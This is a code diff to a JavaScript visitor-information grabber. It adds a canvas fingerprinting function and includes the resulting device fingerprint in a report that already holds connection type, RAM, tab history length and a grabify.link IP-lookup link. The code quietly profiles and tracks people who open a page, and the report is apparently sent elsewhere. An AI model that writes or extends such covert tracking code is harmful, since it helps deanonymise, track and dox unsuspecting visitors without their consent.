@@ -235,8 +235,28 @@ function getHistoryLength() {
 }
 
 
+// full credit to github user oelin for this one :3 (im way to stupid to figure out how to do this)
+// github.com/oelin/fingerprint
+async function createCanvasFingerprint() {
 
+	let canvasElement = document.createElement('canvas')
+	let canvasContext = canvasElement.getContext('2d')
 
+	canvasContext.fillText('abc', 0, 100)
+	canvasContext.beginPath()
+	canvasContext.arc(20, 20, 20, 0, 6)
+	canvasContext.fillStyle = 'red'
+	canvasContext.fill()
+
+	let canvasData = (new TextEncoder).encode(canvasElement.toDataURL())
+	let canvasFingerprint = await crypto.subtle.digest('sha-1', canvasData)
+
+	canvasFingerprint = new Uint8Array(canvasFingerprint)
+	canvasFingerprint = String.fromCharCode(...canvasFingerprint)
+	canvasFingerprint = btoa(canvasFingerprint)
+
+	return canvasFingerprint 
+}
 
 	
 
@@ -304,8 +324,9 @@ const historyInfo = getHistoryLength();
 
 
 	
-connectionType = getConnection();
+let connectionType = getConnection();
 
+let fingerprint = await createCanvasFingerprint();
 
 
 const message = `
@@ -335,6 +356,7 @@ Check here to see IP VPN and Location status <https://grabify.link/ip-lookup/${i
 - Internet Connection Type: ${connectionType}
 - RAM (available to browser): ${ram}
 - Tab history length: ${historyInfo}
+- Device Canvas Fingerprint: ${fingerprint}
 `;
 
 const msg = {
